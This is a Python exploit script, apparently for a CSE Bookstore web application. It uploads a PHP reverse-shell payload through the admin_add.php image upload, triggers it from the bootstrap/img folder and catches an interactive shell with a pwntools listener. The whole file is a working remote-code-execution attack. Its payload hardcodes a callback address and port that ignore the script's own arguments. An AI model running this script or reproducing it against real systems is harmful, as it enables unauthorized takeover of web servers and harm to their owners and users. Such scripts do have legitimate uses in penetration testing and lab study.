import requests
import argparse
from pwn import listen
from time import sleep

parser = argparse.ArgumentParser(description='---- CSE Bookstore RCE ----\n')
parser.add_argument('-u', dest='url', required=True, help='The url of the Target')
parser.add_argument('-l', dest='lhost', required=True, help='The IP of the Attacker')
parser.add_argument('-p', dest='lport', type=int ,required=True, help='The listening Port')
args = parser.parse_args()
url = args.url
lhost = args.lhost
lport = args.lport

payload = f'<?php $sock=fsockopen("10.21.243.11",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>'

file = {'image': ('revshell.php', payload, 'text/php')}
header = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:141.0): Gecko/20100101 Firefox/141.0'}

print('[+] Uploading Shell...\n')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)

print(f'[+] Starting Listener...')
lp = listen(lport, bindaddr=lhost)
sleep(2)
requests.get(url + '/bootstrap/img/revshell.php', headers=header, verify=False, stream=True)
lp.wait_for_connection()
lp.interactive()
